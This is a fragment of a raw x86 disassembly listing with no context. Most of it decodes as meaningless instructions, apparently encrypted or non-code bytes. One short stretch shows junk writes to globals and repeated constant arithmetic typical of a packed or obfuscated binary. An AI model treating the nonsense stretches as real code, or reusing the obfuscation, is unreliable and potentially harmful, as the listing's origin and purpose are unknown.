  40acb2:	or     ecx,DWORD PTR [esi]
  40acb4:	retf   
  40acb5:	retf   0xd3cb
  40acb8:	jmp    0xd005a3b0
  40acbd:	in     al,dx
  40acbe:	aad    0xc8
  40acc0:	(bad)  
  40acc1:	rcl    ecx,1
  40acc3:	std    
  40acc4:	shr    ah,cl
  40acc6:	add    ecx,esp
  40acc8:	faddp  st(7),st
  40acca:	ret    
  40accb:	fiadd  WORD PTR [ecx]
  40accd:	fisttp WORD PTR [eax]
  40accf:	test   cl,0x8
  40acd2:	clc    
  40acd3:	retf   
  40acd4:	pop    es
  40acd5:	icebp  
  40acd6:	fucomp st(2)
  40acd8:	jmp    0xd1eb95b0
  40acdd:	in     al,0xec
  40acdf:	out    dx,eax
  40ace0:	(bad)  
  40ace2:	call   0xfa1180e5
  40ace7:	clc    
  40ace8:	into   
  40ace9:	idiv   bh
  40aceb:	jmp    0x40acad
  40aced:	push   es
  40acee:	add    bl,bh
  40acf0:	(bad)  
  40acf1:	jmp    0x40accd
  40acf3:	add    eax,0xe5edd3d3
  40acf8:	(bad)  
  40acfa:	lods   al,BYTE PTR ds:[esi]
  40acfb:	mov    cl,0xb1
  40acfd:	out    dx,eax
  40acfe:	fld    st(4)
  40ad00:	(bad)  
  40ad01:	int    0xdf
  40ad03:	fiadd  WORD PTR [edx]
  40ad05:	lock add eax,ebx
  40ad08:	pop    es
  40ad09:	mov    esp,0xc2f2c0c0
  40ad0e:	aad    0xd0
  40ad10:	out    dx,eax
  40ad11:	aam    0xf8
  40ad13:	loope  0x40ad1e
  40ad15:	add    bh,cl
  40ad17:	fisubr WORD PTR [ebp-0x1f1c3b37]
  40ad1d:	(bad)  
  40ad1f:	in     al,dx
  40ad20:	(bad)  
  40ad21:	mov    ch,0xe8
  40ad23:	call   0xe02285e4
  40ad28:	mov    edi,0xbc3be05
  40ad2d:	dec    bl
  40ad2f:	xlat   BYTE PTR ds:[ebx]
  40ad30:	fcomp  st(2)
  40ad32:	add    al,BYTE PTR [ebx]
  40ad34:	enter  0xe90d,0xad
  40ad38:	into   
  40ad39:	loop   0x40ad08
  40ad3b:	jmp    0xd5b4:0xc9e0eec5
  40ad42:	mov    edi,0x1b0d2d3
  40ad47:	int    0xc0
  40ad49:	add    al,al
  40ad4b:	(bad)
  40ad4e:	ret    0xe03
  40ad51:	or     eax,0xcdf9d404
  40ad56:	ret    0xc9d2
  40ad59:	mov    ebp,0x33084d8b
  40ad5e:	mul    BYTE PTR [ecx+0x43772f]
  40ad64:	add    DWORD PTR ds:0x437767,eax
  40ad6a:	sub    ecx,0x5424137
  40ad70:	inc    eax
  40ad71:	sbb    esi,0x0
  40ad74:	xor    eax,DWORD PTR ds:0x43771b
  40ad7a:	xor    ecx,0x8a29a14b
  40ad80:	adc    eax,DWORD PTR ds:0x43775f
  40ad86:	xor    esi,0x0
  40ad89:	mov    DWORD PTR ds:0x437773,0x7e2
  40ad93:	mov    eax,ds:0x43739f
  40ad98:	mov    eax,DWORD PTR [eax+0x1c8]
  40ad9e:	add    DWORD PTR ds:0x437737,0x43770f
  40ada8:	mov    eax,DWORD PTR [eax]
  40adaa:	sub    DWORD PTR ds:0x437723,0xba8
  40adb4:	cdq    
  40adb5:	or     DWORD PTR ds:0x43771b,0x437747
  40adbf:	sub    eax,0x5424137
  40adc4:	sbb    edx,0x0
  40adc7:	xor    eax,0x8a29a14b
  40adcc:	sub    DWORD PTR ds:0x43772f,0x4df4
  40add6:	xor    edx,0x0
  40add9:	mov    DWORD PTR [ebp-0x2c],ecx
  40addc:	mov    DWORD PTR ds:0x43772f,0x73f6
  40ade6:	mov    DWORD PTR [ebp-0x28],esi
  40ade9:	mov    DWORD PTR ds:0x43772f,0xee1
  40adf3:	mov    DWORD PTR [ebp-0x34],eax
  40adf6:	mov    DWORD PTR ds:0x43772f,0x1b8
  40ae00:	mov    DWORD PTR [ebp-0x30],edx
  40ae03:	mov    DWORD PTR ds:0x43777f,0x1aab
  40ae0d:	mov    eax,DWORD PTR [ebp-0x2c]
  40ae10:	cmp    eax,DWORD PTR [ebp-0x34]
  40ae13:	mov    DWORD PTR ds:0x43777b,0xd67
  40ae1d:	jne    0x40ae34
  40ae23:	mov    eax,0x7348
  40ae28:	mov    eax,DWORD PTR [ebp-0x28]
  40ae2b:	cmp    eax,DWORD PTR [ebp-0x30]
  40ae2e:	je     0x40ae56
  40ae34:	and    DWORD PTR ds:0x43775b,0x1a29
  40ae3e:	mov    eax,DWORD PTR [ebp+0x8]
  40ae41:	add    eax,DWORD PTR [ebp+0xc]
  40ae44:	mov    DWORD PTR ds:0x437753,0x47ad
  40ae4e:	mov    DWORD PTR [ebp+0x8],eax
  40ae51:	jmp    0x40d295
  40ae56:	and    DWORD PTR ds:0x43777f,0x0
  40ae60:	jmp    0x40ae73
  40ae65:	xor    eax,eax
  40ae67:	xor    eax,DWORD PTR ds:0x43777f
  40ae6d:	inc    eax
  40ae6e:	mov    ds:0x43777f,eax
  40ae73:	cmp    DWORD PTR ds:0x43777f,0x17
  40ae7a:	jae    0x40aebd
  40ae80:	cmp    DWORD PTR ds:0x43777f,0x4
  40ae87:	ja     0x40aebd
  40ae8d:	jmp    0x40ae9d
  40ae92:	push   0x75c8
  40ae97:	call   DWORD PTR ds:0x43c998
  40ae9d:	cmp    DWORD PTR ds:0x43777f,0x3
  40aea4:	jne    0x40aeb8
  40aeaa:	xor    eax,eax
  40aeac:	xor    eax,DWORD PTR ds:0x43777f
  40aeb2:	inc    eax
  40aeb3:	mov    ds:0x43777f,eax
  40aeb8:	jmp    0x40ae65
  40aebd:	mov    eax,DWORD PTR [ebp-0x8]
  40aec0:	mov    eax,DWORD PTR [eax]
  40aec2:	xor    ecx,ecx
  40aec4:	sub    eax,0x5424137
  40aec9:	sbb    ecx,0x0
  40aecc:	xor    eax,0x8a29a14b
  40aed1:	xor    ecx,0x0
  40aed4:	xor    eax,0x8a29a14b
  40aed9:	xor    ecx,0x0
  40aedc:	jmp    0x40d22a
  40aee1:	adc    DWORD PTR [edi+0x72f722e7],0x46
  40aee8:	ss hlt 
  40aeea:	icebp  
  40aeeb:	xchg   DWORD PTR [ebx+ebp*4+0x3fcdc155],eax
  40aef2:	pop    es
  40aef3:	jnp    0x40af70
  40aef5:	stos   BYTE PTR es:[edi],al
  40aef6:	cwde   
  40aef7:	jnp    0x40af74
  40aef9:	jmp    0xede0:0xcbe9d6e1
  40af00:	(bad)  
  40af02:	jmp    0x40aed7
  40af04:	ret    0xbcce
  40af07:	inc    esi
  40af09:	loopne 0x40af0b
  40af0b:	add    eax,0xe6c7d4e9
  40af10:	fcmovnu st,st(4)
  40af12:	push   es
  40af13:	(bad)  
  40af15:	mov    esp,0xbdcce2ae
  40af1a:	stos   BYTE PTR es:[edi],al
  40af1b:	into   
  40af1c:	loopne 0x40aef5
  40af1e:	call   0xec0597dd
  40af23:	(bad)  
  40af24:	mov    esi,0x1c3efd7
  40af29:	repz lds ecx,FWORD PTR [ebx]
  40af2c:	(bad)  
  40af2d:	inc    esp
  40af2f:	(bad)  
  40af31:	leave  
  40af32:	ret    0xd812
  40af35:	loopne 0x40aefd
  40af37:	fdivr  st(1),st
  40af39:	scas   eax,DWORD PTR es:[edi]
  40af3a:	(bad)  
  40af3b:	call   0xeaf3990c
  40af40:	sar    DWORD PTR [ebp-0x20b0c47],cl
  40af46:	int    0xfa
  40af48:	(bad)  
  40af49:	fst    st(4)
  40af4b:	add    ebp,ebx
  40af4d:	mov    edi,0x40fc4c5
  40af52:	(bad)  
  40af53:	jmp    0xd3f25d49
  40af58:	mov    dl,0xce
  40af5a:	jmp    0xbbca:0xb7ecb1d6
  40af61:	aam    0xbb
  40af63:	(bad)  
  40af64:	cld    
  40af65:	add    bl,dh
  40af67:	aad    0xc3
  40af69:	fcmovnbe st,st(0)
  40af6b:	or     ah,al
  40af6d:	in     al,0xf7
  40af6f:	shl    edx,0xe7
  40af72:	fucomip st,st(2)
  40af74:	out    dx,al
  40af75:	retf   0xbcd0
  40af78:	jmp    0x40af4f
  40af7a:	aad    0xeb
  40af7c:	aad    0xc4
  40af7e:	out    dx,eax
  40af7f:	retf   0xbdd1
  40af82:	sar    edx,1
  40af84:	into   
  40af85:	fdivr  st,st(6)
  40af87:	loop   0x40af66
  40af89:	aam    0xf9
  40af8b:	idiv   DWORD PTR [edi+eax*8-0x1635fa35]
  40af92:	out    dx,eax
  40af93:	pinsrw mm5,WORD PTR [esi-0x191b2e31],0xcd
  40af9b:	ret    
  40af9c:	mov    ch,0xb9
  40af9e:	in     eax,0xf5
  40afa0:	mov    edx,0xf6fff2cb
  40afa5:	(bad)  
  40afa7:	add    esi,edx
  40afa9:	shl    al,1
  40afab:	(bad)  
  40afac:	fcmovbe st,st(1)
  40afae:	hlt    
  40afaf:	cmc    
  40afb0:	out    0xe0,al
  40afb2:	or     eax,DWORD PTR [esi]
  40afb4:	leave  
  40afb5:	ret    0xe9bc
  40afb8:	xlat   BYTE PTR ds:[ebx]
  40afb9:	shr    edi,cl
  40afbb:	lock jmp 0xd7dd:0xfeccb6cf
  40afc3:	aad    0xfe
  40afc5:	fsub   st,st(7)
  40afc7:	fucom  st(5)
  40afc9:	in     eax,0x2
  40afcb:	lock add bh,ah
  40afce:	clc    
  40afcf:	hlt    
  40afd0:	jmp    ecx
  40afd2:	push   cs
  40afd3:	iret   
  40afd4:	jecxz  0x40afc6
  40afd6:	fucomip st,st(0)
  40afd8:	out    dx,eax
  40afd9:	(bad)
  40afdc:	in     al,dx
  40afdd:	shl    DWORD PTR [esi-0x4a042e41],1
  40afe3:	(bad)  
  40afe4:	out    dx,al
  40afe5:	enter  0xdc00,0xee
  40afe9:	lock push es
  40afeb:	faddp  st(0),st
  40afed:	(bad)  
  40afef:	jmp    0x40afb9
  40aff1:	into   
  40aff2:	out    dx,al
  40aff3:	stc    
  40aff4:	retf   0xd2c9
  40aff7:	scas   al,BYTE PTR es:[edi]
  40aff8:	enter  0xf7b7,0xc5
  40affc:	out    dx,al
  40affd:	hlt    
  40affe:	in     al,dx
  40afff:	mov    ch,0xb9
  40b001:	into   
  40b002:	(bad)  
  40b003:	in     eax,dx
  40b004:	jmp    0xfff0:0xcef401cc
  40b00b:	add    edi,DWORD PTR [eax-0x261bfe15]
  40b011:	(bad)  
  40b012:	jmp    0xacaf:0xc7c5e8db
  40b019:	mov    bh,0xbc
  40b01b:	cli    
  40b01c:	in     eax,0xd3
  40b01e:	(bad)  
  40b01f:	enter  0xced1,0xf4
  40b023:	enter  0xd6b9,0xc2
  40b027:	int    0xd0
  40b029:	mov    edi,0xf1f8e004
  40b02e:	add    DWORD PTR [esp+ebx*8],eax
  40b031:	int    0xd4
  40b033:	(bad)  
  40b034:	dec    edx
  40b036:	lods   eax,DWORD PTR ds:[esi]
  40b037:	mov    esp,0xc0cdb7dd
  40b03c:	test   al,0xb2
  40b03e:	(bad)  
  40b03f:	int3   
  40b040:	mov    bh,0xd7
  40b042:	mov    eax,0xedc9cdf1
  40b047:	mov    ch,0x1
  40b049:	aad    0xcc
  40b04b:	aam    0xfb
  40b04d:	push   es
  40b04e:	ret    0xfb07
  40b051:	jmp    0xe629b740
  40b056:	fdiv   DWORD PTR [edx-0x150b0a0f]
  40b05c:	repnz shl dl,1
  40b05f:	fild   QWORD PTR [edx+edi*8-0xb081502]
  40b066:	std    
  40b067:	cmc    
  40b068:	pop    es
  40b069:	out    0x3,al
  40b06b:	stc    
  40b06c:	jmp    0x6d8:0xe20ffcc3
  40b073:	sti    
  40b074:	or     esp,ecx
  40b076:	vpmaddwd xmm0,xmm1,xmm2
  40b07a:	out    dx,al
  40b07b:	leave  
  40b07c:	stc    
  40b07d:	(bad)  
  40b07e:	mov    eax,0xb6e9bad9
  40b083:	leave  
  40b084:	jecxz  0x40b073
  40b086:	sar    dh,cl
  40b088:	stc    
  40b089:	hlt    
  40b08a:	(bad)  
  40b08b:	jmp    0xecd9:0xd8c5fcd1
  40b092:	call   0xa92ab977
  40b097:	mov    cl,0xdc
  40b099:	hlt    
  40b09a:	aam    0xcb
  40b09c:	icebp  
  40b09d:	loope  0x40b075
  40b09f:	(bad)  
  40b0a0:	div    dh
  40b0a2:	stc    
  40b0a3:	sar    DWORD PTR [esi-0x2713172b],cl
  40b0a9:	shr    ah,cl
  40b0ab:	clc    
  40b0ac:	jmp    0x40b0b8
  40b0ae:	jecxz  0x40b0b5
  40b0b0:	add    DWORD PTR [ecx],ecx
  40b0b2:	jmp    0xe7f390b6
  40b0b7:	retf   0xb1ae
  40b0ba:	aad    0xd6
  40b0bc:	repz mov al,0xd2
  40b0bf:	into   
  40b0c0:	stc    
  40b0c1:	mov    ebx,0xe0cfc8d1
  40b0c6:	add    ebx,ecx
  40b0c8:	aad    0xff
  40b0ca:	add    ah,bl
  40b0cc:	retf   
  40b0cd:	out    0xf5,eax
  40b0cf:	fndisi(8087 only) 
  40b0d1:	loop   0x40b0b6
  40b0d3:	into   
  40b0d4:	sar    BYTE PTR [esi-0x335b111c],0xf6
  40b0db:	out    0xe7,eax
  40b0dd:	into   
  40b0de:	leave  
  40b0df:	fcomip st,st(4)
  40b0e1:	in     eax,0xb5
  40b0e3:	aad    0xc3
  40b0e5:	rol    DWORD PTR [eax],0xef
  40b0e8:	fdivrp st(4),st
  40b0ea:	fcmovne st,st(3)
  40b0ec:	icebp  
  40b0ed:	not    ah
  40b0ef:	fld    DWORD PTR [eax]
  40b0f1:	or     al,0xce
  40b0f3:	dec    dh
  40b0f5:	in     al,dx
  40b0f6:	in     al,0xeb
  40b0f8:	shl    dl,0xf2
  40b0fb:	in     al,0xac
  40b0fd:	fcmove st,st(6)
  40b0ff:	call   esp
  40b101:	in     al,dx
  40b102:	int    0x2
  40b104:	retf   0xfbfc
  40b107:	mov    eax,0xe0f3e4c6
  40b10c:	jmp    ecx
  40b10e:	ror    DWORD PTR [ecx],0xe3
  40b111:	add    dh,ah
  40b113:	add    eax,0xcac7c508
  40b118:	ret    0xeef3
  40b11b:	in     al,dx
  40b11c:	stc    
  40b11d:	mov    edx,0xb3d3c5d0
  40b122:	int    0xdd
  40b124:	cli    
  40b125:	std    
  40b126:	fsubr  st,st(4)
  40b128:	jecxz  0x40b11f
  40b12a:	shl    bl,cl
  40b12c:	(bad)  
  40b12d:	(bad)  
  40b12e:	retf   
  40b12f:	sti    
  40b130:	stc    
  40b131:	add    bh,bh
  40b133:	(bad)
  40b136:	mov    eax,0xdcc6f6a9
  40b13b:	in     eax,0xb7
  40b13d:	loopne 0x40b0f9
  40b13f:	mov    ecx,0xedcfe4d9
  40b144:	(bad)  
  40b146:	shl    ch,0xd4
  40b149:	add    al,BYTE PTR ds:0xff0afac1
  40b14f:	jmp    0x40b153
  40b151:	add    dh,ch
  40b153:	inc    DWORD PTR [ebx]
  40b155:	test   al,0xe3
  40b157:	(bad)  
  40b158:	retf   
  40b159:	mov    cl,0xe1
  40b15b:	(bad)  
  40b15c:	into   
  40b15d:	shr    DWORD PTR [esi-0x30302f30],1
  40b163:	in     eax,dx
  40b164:	(bad)  
  40b166:	stc    
  40b167:	rcl    ecx,0xbd
  40b16a:	loopne 0x40b143
  40b16c:	add    ch,bl
  40b16e:	fadd   DWORD PTR [ecx]
  40b170:	(bad)  
  40b171:	jmp    0xf0c8:0xbdff0e01
  40b178:	in     al,dx
  40b179:	enter  0xead4,0xe7
  40b17d:	in     al,0xf3
  40b17f:	mov    ch,0xd6
  40b181:	mov    ecx,0xbcf4b8c8
  40b186:	out    dx,al
  40b187:	jecxz  0x40b167
  40b189:	loope  0x40b160
  40b18b:	jmp    edx
  40b18d:	loop   0x40b165
  40b18f:	mov    ebp,0xfdbc3ca
  40b194:	icebp  
  40b195:	lods   eax,DWORD PTR ds:[esi]
  40b196:	xlat   BYTE PTR ds:[ebx]
  40b197:	out    0xa8,al
  40b199:	scas   al,BYTE PTR es:[edi]
  40b19a:	(bad)
  40b19e:	repz hlt 
  40b1a0:	jmp    0x40b171
  40b1a2:	jecxz  0x40b199
  40b1a4:	shr    esp,cl
  40b1a6:	cld    
  40b1a7:	cli    
  40b1a8:	hlt    
  40b1a9:	test   BYTE PTR ds:0xc7f401f8,0xe9
  40b1b0:	out    0xf5,eax
  40b1b2:	std    
  40b1b3:	retf   
  40b1b4:	loopne 0x40b16f
  40b1b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1b7:	repz mov cl,0xf7
  40b1ba:	mov    bl,0xb6
  40b1bc:	aad    0xd4
  40b1be:	int    0xf5
  40b1c0:	fcmovnu st,st(5)
  40b1c2:	xlat   BYTE PTR ds:[ebx]
  40b1c3:	fstp   TBYTE PTR [eax+0x3ccb8f3]
  40b1c9:	in     eax,dx
  40b1ca:	repnz inc BYTE PTR [edi]
  40b1cd:	add    cl,bl
  40b1cf:	hlt    
  40b1d0:	cli    
  40b1d1:	ret    
  40b1d2:	jmp    0x40b1b4
  40b1d4:	call   0xe70384cc
  40b1d9:	ret    0xf7e4
  40b1dc:	loopne 0x40b1b5
  40b1de:	in     eax,dx
  40b1df:	repnz std 
  40b1e1:	mov    ebp,0xf9b4fcbc
  40b1e6:	fidiv  DWORD PTR [ebp-0x93e2103]
  40b1ec:	rcr    al,cl
  40b1ee:	retf   
  40b1ef:	cmc    
  40b1f0:	fsubr  st,st(1)
  40b1f2:	iret   
  40b1f3:	in     al,dx
  40b1f4:	in     al,0xb3
  40b1f6:	scas   eax,DWORD PTR es:[edi]
  40b1f7:	rol    cl,1
  40b1f9:	vpsllq xmm2,xmm7,xmm5
  40b1fd:	(bad)  
  40b1fe:	out    0xe6,eax
  40b200:	out    dx,al
  40b201:	out    dx,eax
  40b202:	repnz add bh,BYTE PTR [ecx-0x32230426]
  40b209:	std    
  40b20a:	add    cl,bh
  40b20c:	(bad)  
  40b20e:	jecxz  0x40b1da
  40b210:	add    DWORD PTR [edi],eax
  40b212:	vpandn ymm5,ymm3,YMMWORD PTR [esi-0x35181d21]
  40b21a:	ret    
  40b21b:	leave  
  40b21c:	jmp    0x40b20c
  40b21e:	(bad)  
  40b21f:	fidivr DWORD PTR [edi-0x1d400518]
  40b225:	ror    edi,cl
  40b227:	rcl    ebp,0xcd
  40b22a:	shl    al,1
  40b22c:	loopne 0x40b216
  40b22e:	imul   al
  40b230:	loope  0x40b23d
  40b232:	jmp    0x40b21f
  40b234:	repnz shl ebx,1
  40b237:	(bad)  
  40b238:	shl    edi,cl
  40b23a:	iret   
  40b23b:	test   eax,0xcaf4ecb3
  40b240:	in     al,dx
  40b241:	fcmovu st,st(2)
  40b243:	cld    
  40b244:	sti    
  40b245:	repz std 
  40b247:	fdiv   st(6),st
  40b249:	fiadd  DWORD PTR [esi+eax*1]
  40b24c:	in     eax,0xe9
  40b24e:	retf   
  40b24f:	loope  0x40b22d
  40b251:	(bad)  
  40b253:	lar    ebx,bp
  40b256:	mov    esi,0xaeb5e6bf
  40b25b:	aam    0xee
  40b25d:	out    dx,al
  40b25e:	(bad)  
  40b25f:	lock repnz fiadd WORD PTR [ebx]
  40b263:	add    ch,ch
  40b265:	rol    BYTE PTR [edi],cl
  40b267:	shl    ebx,cl
  40b269:	cld    
  40b26a:	idiv   ah
  40b26c:	(bad)  
  40b26d:	pop    es
  40b26e:	add    eax,0xecf9c4d9
  40b273:	jmp    0xe6c6:0xd2cedfe5
  40b27a:	out    dx,al
  40b27b:	out    0xee,al
  40b27d:	mov    bh,0xf9
  40b27f:	test   ah,0xc4
  40b282:	clc    
  40b283:	std    
  40b284:	loop   0x40b260
  40b286:	mov    dh,0xd6
  40b288:	out    0xe4,al
  40b28a:	add    DWORD PTR [ebp-0x113af406],edi
  40b290:	or     BYTE PTR [ebx],cl
  40b292:	fsub   st(7),st
  40b294:	int    0xaf
  40b296:	shl    BYTE PTR [ebp-0x4d331516],1
  40b29c:	into   
  40b29d:	in     eax,dx
  40b29e:	sar    DWORD PTR [ecx-0x233350b],cl
  40b2a4:	rol    DWORD PTR [eax],cl
  40b2a6:	fdivr  QWORD PTR [ecx-0x431c1e20]
  40b2ac:	or     ch,al
  40b2ae:	call   0xea219296
  40b2b3:	add    cl,BYTE PTR [edi]
  40b2b5:	scas   eax,DWORD PTR es:[edi]
  40b2b6:	mov    ebp,0xb7d6bdc7
  40b2bb:	loope  0x40b274
  40b2bd:	mov    cl,0xd7
  40b2bf:	(bad)  
  40b2c0:	into   
  40b2c1:	rcl    cl,cl
  40b2c3:	clc    
  40b2c4:	hlt    
  40b2c5:	fcom   st(4)
  40b2c7:	add    edi,eax
  40b2c9:	fdivrp st(1),st
  40b2cb:	icebp  
  40b2cc:	clc    
  40b2cd:	add    eax,esi
  40b2cf:	wbinvd 
  40b2d1:	or     ebx,eax
  40b2d3:	or     eax,eax
  40b2d5:	mov    eax,0xc9d6e8e9
  40b2da:	mul    dl
  40b2dc:	int3   
  40b2dd:	into   
  40b2de:	out    dx,eax
  40b2df:	mov    cl,0xdf
  40b2e1:	(bad)  
  40b2e2:	(bad)  
  40b2e4:	loop   0x40b2e8
  40b2e6:	(bad)  
  40b2e8:	ret    
  40b2e9:	add    ebx,ebx
  40b2eb:	fxtract 
  40b2ed:	(bad)  
  40b2ee:	fcomp  st(0)
  40b2f0:	fsubr  st,st(0)
  40b2f2:	or     ebx,ecx
  40b2f4:	leave  
  40b2f5:	int    0xc1
  40b2f7:	in     al,dx
  40b2f8:	retf   0xc8ec
  40b2fb:	mov    bl,0xf4
  40b2fd:	int3   
  40b2fe:	mov    eax,0xb9b7dfff
  40b303:	mov    edx,0xdfc8f7bf
  40b308:	mov    DWORD PTR [edx],0xc5e5f0fd
  40b30e:	jmp    0x40b31e
  40b310:	(bad)
  40b313:	or     BYTE PTR [edi],cl
  40b315:	rcl    eax,1
  40b317:	test   al,0xc5
  40b319:	in     eax,0xcb
  40b31b:	shl    edx,1
  40b31d:	mov    bh,0xec
  40b31f:	out    dx,al
  40b320:	out    dx,eax
  40b321:	cmc    
  40b322:	mov    esp,0xf6fef4df
  40b327:	fcmovnb st,st(1)
  40b329:	lock shl bl,cl
  40b32c:	in     eax,0xd5
  40b32e:	mul    ebp
  40b330:	jecxz  0x40b338
  40b332:	or     eax,0xd3cde4e6
  40b337:	test   al,0xcc
  40b339:	lods   eax,DWORD PTR ds:[esi]
  40b33a:	out    dx,eax
  40b33b:	ret    0xdbf0
  40b33e:	fnstcw WORD PTR [eax-0x13200a0d]
  40b344:	out    dx,eax
  40b345:	add    esp,ebp
  40b347:	fdivrp st(1),st
  40b349:	in     eax,dx
  40b34a:	ret    
  40b34b:	neg    cl
  40b34d:	aam    0xe1
  40b34f:	(bad)  
  40b350:	loop   0x40b358
  40b352:	add    bh,bh
  40b354:	int3   
  40b355:	les    ebp,FWORD PTR [edx-0xe383a40]
  40b35b:	sti    
  40b35c:	out    dx,eax
  40b35d:	mov    edx,0xedd3adf5
  40b362:	lock jmp 0xe709a526
  40b368:	loop   0x40b33c
  40b36a:	(bad)
  40b36d:	jmp    0x40b334
  40b36f:	leave  
  40b370:	push   es
  40b371:	out    0x8,al
  40b373:	enter  0xc3ce,0xad
  40b377:	out    dx,eax
  40b378:	not    ecx
  40b37a:	ret    
  40b37b:	mov    ch,0xd0
  40b37d:	mov    ebx,0xb8bef1f8
  40b382:	mov    dl,0xf1
  40b384:	iret   
  40b385:	xlat   BYTE PTR ds:[ebx]
  40b386:	add    al,BYTE PTR [edi]
  40b388:	int    0x2
  40b38a:	add    ch,ah
  40b38c:	(bad)  
  40b38d:	fld    st(6)
  40b38f:	push   cs
  40b390:	into   
  40b391:	(bad)  
  40b393:	add    dh,cl
  40b395:	shl    bl,1
  40b397:	shl    DWORD PTR [esi-0x1e341f44],cl
  40b39d:	int    0xeb
  40b39f:	mov    eax,0xc3ecbff5
  40b3a4:	loope  0x40b397
  40b3a6:	enter  0x5fc,0x2
  40b3aa:	(bad)  
  40b3ab:	in     eax,0xb
  40b3ad:	rcr    edx,0xc0
  40b3b0:	add    ebp,ecx
  40b3b2:	adc    esp,eax
  40b3b4:	stc    
  40b3b5:	enter  0xa5be,0xcb
  40b3b9:	mov    dl,0xc9
  40b3bb:	icebp  
  40b3bc:	out    dx,eax
  40b3bd:	aam    0xd2
  40b3bf:	mov    al,0xcb
  40b3c1:	mov    ebp,0xb9f4f6b9
  40b3c6:	rcl    esp,1
  40b3c8:	int3   
  40b3c9:	rol    ebx,1
  40b3cb:	add    DWORD PTR [edi],eax
  40b3cd:	cmc    
  40b3ce:	std    
  40b3cf:	sar    edx,0xcd
  40b3d2:	sti    
  40b3d3:	jmp    0xf32f66aa
  40b3d8:	in     al,dx
  40b3d9:	in     eax,dx
  40b3da:	call   0xb10c8e8b
  40b3df:	fcmovne st,st(7)
  40b3e1:	in     al,dx
  40b3e2:	mov    dh,0xe8
  40b3e4:	jecxz  0x40b3dd
  40b3e6:	out    dx,al
  40b3e7:	clc    
  40b3e8:	clc    
  40b3e9:	(bad)  
  40b3ea:	aad    0xdb
  40b3ec:	add    ebx,eax
  40b3ee:	ret    0xc8fd
  40b3f1:	ret    
  40b3f2:	out    0xed,eax
  40b3f4:	push   es
  40b3f5:	ret    
  40b3f6:	mov    bl,0xb3
  40b3f8:	int3   
  40b3f9:	mov    cl,0xca
  40b3fb:	ret    
  40b3fc:	shl    al,cl
  40b3fe:	(bad)  
  40b400:	in     eax,dx
  40b401:	cli    
  40b402:	mov    eax,0xf3b8b803
  40b407:	in     eax,dx
  40b408:	add    ecx,edx
  40b40a:	fxam   
  40b40c:	aad    0xf0
  40b40e:	(bad)  
  40b40f:	(bad)  
  40b411:	cld    
  40b412:	(bad)
  40b415:	loopne 0x40b3e1
  40b417:	shl    BYTE PTR [edx-0x240c1e17],1
  40b41d:	clc    
  40b41e:	out    dx,eax
  40b41f:	lock jmp 0x40b3ee
  40b422:	shr    dh,1
  40b424:	add    esi,ebx
  40b426:	call   0xd221a712
  40b42b:	add    esp,edx
  40b42d:	lock fiadd WORD PTR [eax]
  40b430:	push   es
  40b431:	lds    ecx,FWORD PTR [esi]
  40b433:	add    esi,ecx
  40b435:	jmp    0xed0e631d
  40b43a:	mov    bl,0xe1
  40b43c:	fxch   st(4)
  40b43e:	shl    eax,1
  40b440:	cmc    
  40b441:	mov    edx,0xd2eec9dc
  40b446:	iret   
  40b447:	add    al,bh
  40b449:	aam    0xc5
  40b44b:	push   ebp
  40b44d:	aam    0xf0
  40b44f:	in     eax,0xe6
  40b451:	(bad)  
  40b452:	int3   
  40b453:	jmp    0xaf1d6d20
  40b458:	retf   
  40b459:	xlat   BYTE PTR ds:[ebx]
  40b45a:	in     al,dx
  40b45b:	sar    ecx,0xc1
  40b45e:	aam    0xcc
  40b460:	call   0xf01c6958
  40b465:	enter  0xdee2,0xf0
  40b469:	int    0xc3
  40b46b:	aad    0xb8
  40b46d:	fcmovnu st,st(7)
  40b46f:	add    al,0xef
  40b471:	out    0xfd,eax
  40b473:	push   cs
  40b474:	repnz in eax,dx
  40b476:	mov    bl,0xae
  40b479:	ret    
  40b47a:	out    0xf7,al
  40b47c:	mov    esi,0xfcfddaf6
  40b482:	in     al,dx
  40b483:	rol    bl,1
  40b485:	loopne 0x40b486
  40b487:	aam    0xf8
  40b489:	mov    edi,0xbff1f803
  40b48e:	not    ebp
  40b490:	out    dx,al
  40b491:	std    
  40b492:	jmp    0x40b4a3
  40b494:	repnz shr esp,0xf3
  40b498:	mov    al,0xae
  40b49a:	int3   
  40b49b:	(bad)  
  40b49c:	into   
  40b49d:	mov    dh,0xd1
  40b49f:	jmp    0xbdfe918a
  40b4a4:	into   
  40b4a5:	int    0xf4
  40b4a7:	rcl    ah,1
  40b4a9:	out    0xe6,eax
  40b4ab:	aad    0xe9
  40b4ad:	cmc    
  40b4ae:	hlt    
  40b4af:	fst    st(4)
  40b4b1:	fisttp QWORD PTR [ecx]
  40b4b3:	repz iret 
  40b4b5:	out    0xed,al
  40b4b7:	ror    ebp,1
  40b4b9:	jmp    0xcded:0xf3e8f4ef
  40b4c0:	(bad)  
  40b4c1:	sti    
  40b4c2:	mov    dl,0xff
  40b4c4:	loop   0x40b4b9
  40b4c6:	add    edx,ecx
  40b4c8:	loop   0x40b48a
  40b4ca:	fstp   st(1)
  40b4cc:	(bad)
  40b4cf:	loopne 0x40b49c
  40b4d1:	push   es
  40b4d2:	fucomi st,st(0)
  40b4d4:	add    eax,ecx
  40b4d6:	test   al,0xc0
  40b4d8:	(bad)  
  40b4d9:	shl    BYTE PTR [ecx+esi*4-0x38301832],cl
  40b4e0:	retf   
  40b4e1:	out    dx,al
  40b4e2:	cmc    
  40b4e3:	leave  
  40b4e4:	fxtract 
  40b4e6:	out    0xdd,eax
  40b4e8:	pop    es
  40b4e9:	fidivr WORD PTR [ebp+esi*8+0x3e1e0c4]
  40b4f0:	cmc    
  40b4f1:	clts   
  40b4f3:	out    0x13,al
  40b4f5:	jmp    0xece7:0xabeeb0b8
  40b4fc:	fcomi  st,st(6)
  40b4fe:	iret   
  40b4ff:	(bad)
  40b502:	clc    
  40b503:	ror    esi,cl
  40b505:	fmul   st(5),st
  40b507:	hlt    
  40b508:	fcomip st,st(7)
  40b50a:	mov    edx,0xe5d1f4f7
  40b50f:	cmc    
  40b510:	pop    es
  40b511:	jecxz  0x40b50e
  40b513:	loop   0x40b519
  40b515:	loope  0x40b509
  40b517:	mov    cl,0xbc
  40b519:	mov    bl,0xd4
  40b51b:	(bad)  
  40b51d:	out    0xe8,al
  40b51f:	mov    cl,0xd2
  40b521:	clc    
  40b522:	mov    edx,0xbcd2ced7
  40b527:	cmc    
  40b528:	add    edi,DWORD PTR [ebx-0x1d0afb44]
  40b52e:	add    esp,edx
  40b530:	fcmove st,st(2)
